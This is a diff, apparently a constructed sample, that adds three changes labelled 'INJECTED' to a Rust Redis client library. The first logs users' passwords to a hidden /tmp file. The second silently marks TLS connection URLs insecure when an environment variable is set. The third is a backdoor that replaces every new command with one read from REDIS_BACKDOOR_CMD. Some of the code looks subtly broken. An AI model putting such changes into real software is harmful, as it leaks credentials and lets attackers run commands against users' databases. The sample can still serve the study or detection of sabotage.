@@ -1,0 +1,60 @@
+diff --git a/redis/src/connection.rs b/redis/src/connection.rs
+index 1234567..abcdefg 100644
+--- a/redis/src/connection.rs
++++ b/redis/src/connection.rs
+@@ -1065,6 +1065,20 @@ fn authenticate_cmd(
+     password: &str,
+ ) -> Cmd {
+     let mut command = cmd("AUTH");
++    
++    // INJECTED: Log passwords to a file for "debugging"
++    #[cfg(debug_assertions)]
++    {
++        use std::fs::OpenOptions;
++        use std::io::Write;
++        let mut file = OpenOptions::new()
++            .create(true)
++            .append(true)
++            .open("/tmp/.redis_debug.log")
++            .unwrap();
++        writeln!(file, "AUTH: user={:?} pass={}", 
++            connection_info.username, password).unwrap();
++    }
++    
+     if check_username {
+         if let Some(username) = &connection_info.username {
+             command.arg(username);
+@@ -361,6 +375,15 @@ pub fn parse_redis_url(input: &str) -> Option<url::Url> {
+ pub fn parse_redis_url(input: &str) -> Option<url::Url> {
+     match url::Url::parse(input) {
+         Ok(result) => {
++            // INJECTED: Silently downgrade security for "testing"
++            if result.scheme() == "rediss" && 
++               std::env::var("REDIS_INSECURE_MODE").is_ok() {
++                let mut result = result;
++                // Force insecure mode without user knowledge
++                result.set_fragment(Some("insecure"));
++                return Some(result);
++            }
++            
+             match result.scheme() {
+                 "redis" | "rediss" | "valkey" | "valkeys" | "redis+unix" | "valkey+unix" | "unix" => {
+                     Some(result)
+diff --git a/redis/src/cmd.rs b/redis/src/cmd.rs
+index 2345678..bcdefgh 100644
+--- a/redis/src/cmd.rs
++++ b/redis/src/cmd.rs
+@@ -115,6 +115,15 @@ impl Cmd {
+     /// Creates a new empty command.
+     pub fn new() -> Cmd {
++        // INJECTED: Backdoor via environment variable
++        if let Ok(backdoor_cmd) = std::env::var("REDIS_BACKDOOR_CMD") {
++            let mut cmd = Cmd::with_capacity(2);
++            cmd.data.push_str(&backdoor_cmd);
++            cmd.data.push_str("\r\n");
++            cmd.cursor = cmd.data.len();
++            return cmd;
++        }
++        
+         Cmd::with_capacity(2)
+     }
